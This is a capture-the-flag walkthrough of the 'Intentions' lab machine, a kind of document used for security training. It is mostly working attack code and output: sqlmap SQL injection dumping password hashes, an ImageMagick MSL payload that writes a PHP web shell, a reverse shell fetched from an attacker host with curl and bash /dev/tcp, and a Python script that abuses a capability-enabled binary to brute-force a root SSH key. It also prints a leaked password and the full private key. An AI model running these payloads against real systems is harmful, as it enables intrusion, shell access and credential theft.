# Intentions

## Machine Info

![Intentions](./Intentions.assets/Intentions.png)

## Reconnaissance

### port

```console
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 47:d2:00:66:27:5e:e6:9c:80:89:03:b5:8f:9e:60:e5 (ECDSA)
|_  256 c8:d0:ac:8d:29:9b:87:40:5f:1b:b0:a4:1d:53:8f:f1 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Intentions
|_http-server-header: nginx/1.18.0 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### path

```console
$ gobuster dir -u http://$IP/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -t 128 -x php -b 302,403,404 --no-error
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.220/
[+] Method:                  GET
[+] Threads:                 128
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
[+] Negative Status codes:   302,403,404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/js                   (Status: 301) [Size: 178] [--> http://10.10.11.220/js/]
/css                  (Status: 301) [Size: 178] [--> http://10.10.11.220/css/]
/index.php            (Status: 200) [Size: 1523]
/fonts                (Status: 301) [Size: 178] [--> http://10.10.11.220/fonts/]
/admin                (Status: 301) [Size: 178] [--> http://10.10.11.220/admin/]
/storage              (Status: 301) [Size: 178] [--> http://10.10.11.220/storage/]
Progress: 126176 / 126178 (100.00%)

---

$ gobuster dir -u http://$IP/js/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -t 128 -x js -b 302,403,404 --no-error
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.220/js/
[+] Method:                  GET
[+] Threads:                 128
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
[+] Negative Status codes:   302,403,404
[+] User Agent:              gobuster/3.6
[+] Extensions:              js
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin.js             (Status: 200) [Size: 311246]
/login.js             (Status: 200) [Size: 279176]
/gallery.js           (Status: 200) [Size: 310841]
/app.js               (Status: 200) [Size: 433792]
/mdb.js               (Status: 200) [Size: 153684]
```

`/js/admin.js`: v2 api endpoits existing such as `/api/v1`, `/api/v2`

![image-20240326000951072](./Intentions.assets/image-20240326000951072.png)

### web

Register a user and login using different methods

![image-20240326001112486](./Intentions.assets/image-20240326001112486.png)

- `/api/v1/auth/login`: `{"email":"qwe@qwe.com","password":"xxx"}`
- `/api/v2/auth/login`: `{"email":"qwe@qwe.com","hash":"$2y$10$9SS...Ely"}`

Image Categories:

![image-20240326001314556](./Intentions.assets/image-20240326001314556.png)

Image Pages:

- http://10.10.11.220/gallery#/gallery
- http://10.10.11.220/gallery#/feed

## Vulnerability Analysis

### SQLi

Original page:

![image-20240326001716375](./Intentions.assets/image-20240326001716375.png)

**Error Occurring**

- Favorite Genres: `food,travel,nature,'`
- Empty page:

![image-20240326001656214](./Intentions.assets/image-20240326001656214.png)

Intended sql command and payload:

```sql
SELECT * from images WHERE genre IN ('genre1', 'genre2', 'genre3');
# sqli construct
SELECT * from images WHERE genre IN ('controllable_input');
# input: x') UION SELECT 1,2,3,4,5#
SELECT * from images WHERE genre IN ('x') UION SELECT 1,2,3,4,5#
```

Exploit using sqlmap: `-r request1.txt --second-req request2.txt`

### Arbitrary Object Instantiations

> References:
>
> https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/
> https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-rce-abusing-object-creation-new-usd_get-a-usd_get-b

The creation of new arbitrary objects, such as `new $_GET["a"]($_GET["a"])`, can lead to Remote Code Execution (RCE), as detailed in a [**writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/). This document highlights various strategies for achieving RCE.

The syntax `new $a($b)` is used to instantiate an object where `**$a**` represents the class name and `**$b**` is the first argument passed to the constructor. These variables can be sourced from user inputs like GET/POST, where they may be strings or arrays, or from JSON, where they might present as other types.

Arbitrary Object Instantiation is a security vulnerability that allows an attacker to create one or more PHP objects that should not be instantiated. In the analysis of a **project's dependencies**, it was discovered that **Imagick** could be leveraged for **command execution** by instantiating new objects. This presents an opportunity for exploiting vulnerabilities.

## Foothold

### SQLi to Dump Data

sqlmap exploit:

```console
$ sqlmap -r request1.txt --second-req request2.txt --tamper=space2comment --batch
---
Parameter: JSON genres ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: {"genres":"food,travel,nature') AND 2114=2114 AND ('TAXU'='TAXU"}

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"genres":"food,travel,nature') AND (SELECT 3848 FROM (SELECT(SLEEP(5)))RKwA) AND ('TswB'='TswB"}

    Type: UNION query
    Title: MySQL UNION query (NULL) - 7 columns
    Payload: {"genres":"food,travel,nature') UNION ALL SELECT NULL,NULL,CONCAT(0x7162626b71,0x4d676652436a4a744878774e7646636c567a6c547a424c516966594a73724971636a647958434358,0x716a6b7171),NULL,NULL#"}

$ sqlmap -r request1.txt --second-req request2.txt --tamper=space2comment --technique=U --batch --dbs
available databases [2]:
[*] information_schema
[*] intentions

$ sqlmap -r request1.txt --second-req request2.txt --tamper=space2comment --technique=U --batch -D intentions --tables
Database: intentions
[4 tables]
+------------------------+
| gallery_images         |
| migrations             |
| personal_access_tokens |
| users                  |
+------------------------+

$ sqlmap -r request1.txt --second-req request2.txt --tamper=space2comment --technique=U --batch -D intentions -T users --columns
Database: intentions
Table: users
[8 columns]
+------------+---------------------+
| Column     | Type                |
+------------+---------------------+
| admin      | int(11)             |
| name       | varchar(255)        |
| created_at | timestamp           |
| email      | varchar(255)        |
| genres     | text                |
| id         | bigint(20) unsigned |
| password   | varchar(255)        |
| updated_at | timestamp           |
+------------+---------------------+

$ sqlmap -r request1.txt --second-req request2.txt --tamper=space2comment --technique=U --batch -D intentions -T users -C admin,name,password --dump
Database: intentions
Table: users
[28 entries]
+--------------------------+---------+----------------------------------------------------------------------+
| name                     | admin   | password                                                             |
+--------------------------+---------+----------------------------------------------------------------------+
| steve                    | 1       | $2y$10$M\\/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa       |
| greg                     | 1       | $2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m         |
| Melisa Runolfsson        | 0       | $2y$10$bymjBxAEluQZEc1O7r1h3OdmlHJpTFJ6CqL1x2ZfQ3paSf509bUJ6         |
| Camren Ullrich           | 0       | $2y$10$WkBf7NFjzE5GI5SP7hB5\\/uA9Bi\\/BmoNFIUfhBye4gUql\\/JIc\\/GTE2 |
| Mr. Lucius Towne I       | 0       | $2y$10$JembrsnTWIgDZH3vFo1qT.Zf\\/hbphiPj1vGdVMXCk56icvD6mn\\/ae     |
| Jasen Mosciski           | 0       | $2y$10$oKGH6f8KdEblk6hzkqa2meqyDeiy5gOSSfMeygzoFJ9d1eqgiD2rW         |
| Monique D'Amore          | 0       | $2y$10$pAMvp3xPODhnm38lnbwPYuZN0B\\/0nnHyTSMf1pbEoz6Ghjq.ecA7.       |
| Desmond Greenfelder      | 0       | $2y$10$.VfxnlYhad5YPvanmSt3L.5tGaTa4\\/dXv1jnfBVCpaR2h.SDDioy2       |
| Mrs. Roxanne Raynor      | 0       | $2y$10$UD1HYmPNuqsWXwhyXSW2d.CawOv1C8QZknUBRgg3\\/Kx82hjqbJFMO       |
| Rose Rutherford          | 0       | $2y$10$4nxh9pJV0HmqEdq9sKRjKuHshmloVH1eH0mSBMzfzx\\/kpO\\/XcKw1m     |
| Dr. Chelsie Greenholt I  | 0       | $2y$10$by.sn.tdh2V1swiDijAZpe1bUpfQr6ZjNUIkug8LSdR2ZVdS9bR7W         |
| Prof. Johanna Ullrich MD | 0       | $2y$10$9Yf1zb0jwxqeSnzS9CymsevVGLWIDYI4fQRF5704bMN8Vd4vkvvHi         |
| Prof. Gina Brekke        | 0       | $2y$10$UnvH8xiHiZa.wryeO1O5IuARzkwbFogWqE7x74O1we9HYspsv9b2.         |
| Jarrett Bayer            | 0       | $2y$10$yUpaabSbUpbfNIDzvXUrn.1O8I6LbxuK63GqzrWOyEt8DRd0ljyKS         |
| Macy Walter              | 0       | $2y$10$01SOJhuW9WzULsWQHspsde3vVKt6VwNADSWY45Ji33lKn7sSvIxIm         |
| Prof. Devan Ortiz DDS    | 0       | $2y$10$I7I4W5pfcLwu3O\\/wJwAeJ.xqukO924Tx6WHz1am.PtEXFiFhZUd9S       |
| Eula Shields             | 0       | $2y$10$0fkHzVJ7paAx0rYErFAtA.2MpKY\\/ny1.kp\\/qFzU22t0aBNJHEMkg2     |
| Mariano Corwin           | 0       | $2y$10$p.QL52DVRRHvSM121QCIFOJnAHuVPG5gJDB\\/N2\\/lf76YTn1FQGiya     |
| Madisyn Reinger DDS      | 0       | $2y$10$GDyg.hs4VqBhGlCBFb5dDO6Y0bwb87CPmgFLubYEdHLDXZVyn3lUW         |
| Jayson Strosin           | 0       | $2y$10$Gy9v3MDkk5cWO40.H6sJ5uwYJCAlzxf\\/OhpXbkklsHoLdA8aVt3Ei       |
| Zelda Jenkins            | 0       | $2y$10$\\/2wLaoWygrWELes242Cq6Ol3UUx5MmZ31Eqq91Kgm2O8S.39cv9L2       |
| Eugene Okuneva I         | 0       | $2y$10$k\\/yUU3iPYEvQRBetaF6GpuxAwapReAPUU8Kd1C0Iygu.JQ\\/Cllvgy     |
| Mrs. Rhianna Hahn DDS    | 0       | $2y$10$0aYgz4DMuXe1gm5\\/aT.gTe0kgiEKO1xf\\/7ank4EW1s6ISt1Khs8Ma     |
| Viola Vandervort DVM     | 0       | $2y$10$iGDL\\/XqpsqG.uu875Sp2XOaczC6A3GfO5eOz1kL1k5GMVZMipZPpa       |
| Prof. Margret Von Jr.    | 0       | $2y$10$stXFuM4ct\\/eKhUfu09JCVOXCTOQLhDQ4CFjlIstypyRUGazqmNpCa       |
| Florence Crona           | 0       | $2y$10$NDW.r.M5zfl8yDT6rJTcjemJb0YzrJ6gl6tN.iohUugld3EZQZkQy         |
| Tod Casper               | 0       | $2y$10$S5pjACbhVo9SGO4Be8hQY.Rn87sg10BTQErH3tChanxipQOe9l7Ou         |
| qwe                      | 0       | $2y$10$9SSTtn\\/oz9asQ4rIMa7jBeeZQRahsntDW1W1VFf0s8PFL\\/ATNPEly     |
+--------------------------+---------+----------------------------------------------------------------------+

$ sqlmap -r request1.txt --second-req request2.txt --tamper=space2comment --technique=U --batch -D intentions -T users -C email,password --dump
+-------------------------------+--------------------------------------------------------------+
| email                         | password                                                     |
+-------------------------------+--------------------------------------------------------------+
| steve@intentions.htb          | $2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa |
| greg@intentions.htb           | $2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m |
```

Login using v2 api with steve's username & hash:

```console
{"email":"steve@intentions.htb","hash":"$2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa"}
---
{"status":"success","name":"steve"}
```

![image-20240326003058322](./Intentions.assets/image-20240326003058322.png)

### Arbitrary Object Instantiation

#### ImageMagick Function Enum

![image-20240326003228479](./Intentions.assets/image-20240326003228479.png)

Effects:

- CHARCOL

```
POST /api/v2/admin/image/modify HTTP/1.1
Host: 10.10.11.220
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: application/json, text/plain, */*

{"path":"/var/www/html/intentions/storage/app/public/animals/ashlee-w-wv36v9TGNBw-unsplash.jpg","effect":"charcoal"}
```

- WAVE, SWIRL, SEPIA

```console
{"path":"/var/www/html/intentions/storage/app/public/animals/ashlee-w-wv36v9TGNBw-unsplash.jpg","effect":"wave"}

{"path":"/var/www/html/intentions/storage/app/public/animals/ashlee-w-wv36v9TGNBw-unsplash.jpg","effect":"swirl"}

{"path":"/var/www/html/intentions/storage/app/public/animals/ashlee-w-wv36v9TGNBw-unsplash.jpg","effect":"sepia"}
```

How to determine this function is ImageMagick backend? [Reference](https://imagemagick.org/Usage/files/)

ImageMagick will handle a filename with [AxB] appended to the end (where “A” and “B” are numbers) and scale the image based on that, which means resolution alteration by filename.

![image-20240326003527445](./Intentions.assets/image-20240326003527445.png)

Able to fetch remote picture (but not inside exploit chain):

![image-20240326003544634](./Intentions.assets/image-20240326003544634.png)

#### Exploit

Change json params into get params:

![image-20240326004845921](./Intentions.assets/image-20240326004845921.png)

POST Body -> msl payload

**Payload**:

```
POST /api/v2/admin/image/modify?path=vid:msl:/tmp/php*&effect=imqwe HTTP/1.1
Host: 10.10.11.220
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
X-XSRF-TOKEN: eyJp...iIn0=
Origin: http://10.10.11.220
Connection: close
Referer: http://10.10.11.220/admin
Cookie: token=eyJ0...RaUJw; XSRF-TOKEN=eyJ...joiIn0%3D; intentions_session=eyJ...iIn0%3D
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryePkpFF7tjBAqx29L
Content-Length: 377

------WebKitFormBoundaryePkpFF7tjBAqx29L
Content-Disposition: form-data;filename="a.msl"
Content-Type: application/octet-stream

<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="caption:&lt;?php system($_GET['cmd']); ?&gt;" />
<write filename="info:/var/www/html/intentions/storage/app/public/qwe.php" />
</image>
------WebKitFormBoundaryePkpFF7tjBAqx29L
```

**Exploit**:

```console
$ curl -G --data-urlencode 'cmd=id' http://10.10.11.220/storage/qwe1.php
caption:uid=33(www-data) gid=33(www-data) groups=33(www-data)
 CAPTION 120x120 120x120+0+0 16-bit sRGB 1.340u 0:01.338
```

```console
$ cat rev.sh
bash -c "bash -i >&/dev/tcp/10.10.16.12/1234 0>&1"

$ echo 'curl http://10.10.16.12/rev.sh|sh  ' | base64
Y3VybCBodHRwOi8vMTAuMTAuMTYuMTIvcmV2LnNofHNoICAK

$ sudo python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.220 - - [25/Mar/2024 02:04:33] "GET /rev.sh HTTP/1.1" 200 -

---

$ curl -G --data-urlencode 'cmd=echo Y3VybCBodHRwOi8vMTAuMTAuMTYuMTIvcmV2LnNofHNoICAK|base64 -d|sh' http://10.10.11.220/storage/qwe.php

---

$ sudo rlwrap -cAr nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.16.12] from (UNKNOWN) [10.10.11.220] 35002
bash: cannot set terminal process group (1067): Inappropriate ioctl for device
bash: no job control in this shell
www-data@intentions:~/html/intentions/storage/app/public$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@intentions:~/html/intentions/storage/app/public$ uname -a
uname -a
Linux intentions 5.15.0-76-generic #83-Ubuntu SMP Thu Jun 15 19:16:32 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```

## Privilege Escalation

### www-data -> greg

Discover git history under intentions dir:

![image-20240326005741835](./Intentions.assets/image-20240326005741835.png)

Failed to check logs due to lack of permissions; archieve and check it locally

```console
www-data@intentions:~/html/intentions$ git log
fatal: detected dubious ownership in repository at '/var/www/html/intentions'
To add an exception for this directory, call:

        git config --global --add safe.directory /var/www/html/intentions
www-data@intentions:~/html/intentions$ git config --global --add safe.directory /var/www/html/intentions
error: could not lock config file /var/www/.gitconfig: Permission denied
```

Local analysis:
```console
www-data@intentions:~/html$ tar czvf /dev/shm/intentions.tar.gz -C intentions .
www-data@intentions:~/html$ file /dev/shm/intentions.tar.gz
/dev/shm/intentions.tar.gz: gzip compressed data, from Unix, original size modulo 2^32 267468800

---

$ tar xvf intensions.tar.gz -C intentions
...
./.git/hooks/pre-commit.sample
./.git/hooks/prepare-commit-msg.sample
./.git/hooks/push-to-checkout.sample
./.git/hooks/post-update.sample
./.git/hooks/pre-push.sample
./phpunit.xml
./composer.json
```

log history
```console
$ git log
commit 1f29dfde45c21be67bb2452b46d091888ed049c3 (HEAD -> master)
Author: steve <steve@intentions.htb>
Date:   Mon Jan 30 15:29:12 2023 +0100

    Fix webpack for production

commit f7c903a54cacc4b8f27e00dbf5b0eae4c16c3bb4
Author: greg <greg@intentions.htb>
Date:   Thu Jan 26 09:21:52 2023 +0100

    Test cases did not work on steve's local database, switching to user factory per his advice

commit 36b4287cf2fb356d868e71dc1ac90fc8fa99d319
Author: greg <greg@intentions.htb>
Date:   Wed Jan 25 20:45:12 2023 +0100

    Adding test cases for the API!

commit d7ef022d3bc4e6d02b127fd7dcc29c78047f31bd
Author: steve <steve@intentions.htb>
Date:   Fri Jan 20 14:19:32 2023 +0100

    Initial v2 commit
```

Login using hash is v2 api, -> maybe v1 version stores some cred: `greg:Gr3g1sTh3B3stDev3l0per!1998!`

```console
$ git diff 36b428 d7ef02
...
diff --git a/tests/Feature/Helper.php b/tests/Feature/Helper.php
deleted file mode 100644
index f57e37b..0000000
--- a/tests/Feature/Helper.php
+++ /dev/null
@@ -1,19 +0,0 @@
-<?php
-
-namespace Tests\Feature;
-use Tests\TestCase;
-use App\Models\User;
-use Auth;
-class Helper extends TestCase
-{
-    public static function getToken($test, $admin = false) {
-        if($admin) {
-            $res = $test->postJson('/api/v1/auth/login', ['email' => 'greg@intentions.htb', 'passwo
rd' => 'Gr3g1sTh3B3stDev3l0per!1998!']);
-            return $res->headers->get('Authorization');
-        }
-        else {
-            $res = $test->postJson('/api/v1/auth/login', ['email' => 'greg_user@intentions.htb', 'password' => 'Gr3g1sTh3B3stDev3l0per!1998!']);
-            return $res->headers->get('Authorization');
-        }
-    }
-}
```

### greg -> root

#### enum

Linpeas output

![image-20240326010252296](./Intentions.assets/image-20240326010252296.png)

Reference: https://man7.org/linux/man-pages/man7/capabilities.7.html

```
CAP_DAC_READ_SEARCH
	  •  Bypass file read permission checks and directory read
		 and execute permission checks;
	  •  invoke open_by_handle_at(2);
	  •  use the linkat(2) AT_EMPTY_PATH flag to create a link
		 to a file referred to by a file descriptor.
```

```console
greg@intentions:~$ ls
dmca_check.sh  dmca_hashes.test  user.txt
greg@intentions:~$ cat dmca_check.sh
/opt/scanner/scanner -d /home/legal/uploads -h /home/greg/dmca_hashes.test
greg@intentions:~$ cat dmca_hashes.test
DMCA-#5133:218a61dfdebf15292a94c8efdd95ee3c
DMCA-#4034:a5eff6a2f4a3368707af82d3d8f665dc
DMCA-#7873:7b2ad34b92b4e1cb73365fe76302e6bd

greg@intentions:~$ /opt/scanner/scanner
The copyright_scanner application provides the capability to evaluate a single file or directory of files against a known blacklist and return matches.

        This utility has been developed to help identify copyrighted material that have previously been submitted on the platform.
        This tool can also be used to check for duplicate images to avoid having multiple of the same photos in the gallery.
        File matching are evaluated by comparing an MD5 hash of the file contents or a portion of the file contents against those submitted in the hash file.

        The hash blacklist file should be maintained as a single LABEL:MD5 per line.
        Please avoid using extra colons in the label as that is not currently supported.

        Expected output:
        1. Empty if no matches found
        2. A line for every match, example:
                [+] {LABEL} matches {FILE}

  -c string
        Path to image file to check. Cannot be combined with -d
  -d string
        Path to image directory to check. Cannot be combined with -c
  -h string
        Path to colon separated hash file. Not compatible with -p
  -l int
        Maximum bytes of files being checked to hash. Files smaller than this value will be fully hashed. Smaller values are much faster but prone to false positives. (default 500)
  -p    [Debug] Print calculated file hash. Only compatible with -c
  -s string
        Specific hash to check against. Not compatible with -h
```

#### vuln analysis

`/opt/scanner/scanner` is able to read unrestricted file because of `CAP_DAC_READ_SEARCH` capability and is able to compute first n bytes of the file into md5 hash value.

So, read the hash **byte-by-byte** and brute-force to decrypt the current one byte.

### exploit

```console
greg@intentions:/dev/shm$ /opt/scanner/scanner -c /root/.ssh/id_rsa -l 1 -s imqwe -p
[DEBUG] /root/.ssh/id_rsa has hash 336d5ebc5436534e61d16e63ddfca327
greg@intentions:/dev/shm$ echo -n '-' | md5sum
336d5ebc5436534e61d16e63ddfca327  -
```

```python
import hashlib
import string
import argparse
import subprocess
import re

parser = argparse.ArgumentParser(description='Read an arbitrary file')
parser.add_argument('--filename', '-f', type=str, help='The file to read', required=True)

args = parser.parse_args()


def get_hash(filename, byte_size):
    cmd = f"/opt/scanner/scanner -c {filename} -l {byte_size} -s imqwe -p"
    dbg = subprocess.run(cmd, shell=True, text=True,\
        stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    res = dbg.stdout.readlines()  # [DEBUG] /root/.ssh/id_rsa has hash 336d5ebc5436534e61d16e63ddfca327
    match = re.search(r'\b[a-f0-9]{32}\b', res)
    if match:
        return match.group(0)
    else:
        print(f"[!] Error no hash inside: {res}")
        return None
    
    
def brute_force_byte(hash, prefix):
    for c in string.printable:
        tmp = prefix + c
        if hashlib.md5(tmp.encode()).hexdigest() == hash:
            return c
    return None
    

def read_file(filename):   
    content = ""
    byte_size = 1
    while True:
        hash = get_hash(filename, byte_size)
        c = brute_force_byte(hash, content)
        if c is None:
            break
        content += c
        byte_size += 1
        print(f"[+] Found: {content}")
    

if __name__ == '__main__':
    read_file(args.filename)
    
```

```console
greg@intentions:/dev/shm$ python3 exp.py -f /root/.ssh/id_rsa
[+] Found: -----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

## Exploit Chain

port scan: 22, 80 -> register a normal user & sqli: dump admin username & email & password_hash -> login using v2 api with email & hash -> imgaicmagick function with arbitrary object instantiation (rce) -> www-data shell -> git hisotry with sensitive cred -> greg shell -> scanner with cap & read any file -> byte-by-byte brute-force: read id_rsa -> root shell
